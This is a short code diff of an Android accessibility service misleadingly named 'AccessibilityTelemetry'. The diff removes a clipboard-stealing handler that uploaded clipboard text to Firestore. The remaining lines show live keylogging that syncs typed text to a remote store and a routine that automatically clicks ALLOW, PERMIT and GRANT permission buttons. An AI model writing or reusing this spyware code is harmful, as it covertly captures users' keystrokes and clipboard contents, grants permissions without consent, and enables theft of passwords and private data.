@@ -14,7 +14,6 @@ class AccessibilityTelemetry : AccessibilityService() {
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleKeylogging(event)
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> handlePermissionAutomation(event)
-            AccessibilityEvent.TYPE_VIEW_CLICKED -> handleClipboard()
         }
     }
 
@@ -26,15 +25,6 @@ class AccessibilityTelemetry : AccessibilityService() {
         FirestoreSync.syncKeylog(text, pkg)
     }
 
-    private fun handleClipboard() {
-        try {
-            val cm = getSystemService(CLIPBOARD_SERVICE) as android.content.ClipboardManager
-            val clip = cm.primaryClip?.getItemAt(0)?.text?.toString()
-            if (!clip.isNullOrBlank()) {
-                FirestoreSync.syncClipboard(clip)
-            }
-        } catch (_: Exception) {}
-    }
 
     private fun handlePermissionAutomation(event: AccessibilityEvent) {
         // Automation Wizard: Auto-click ALLOW / PERMIT / GRANT buttons
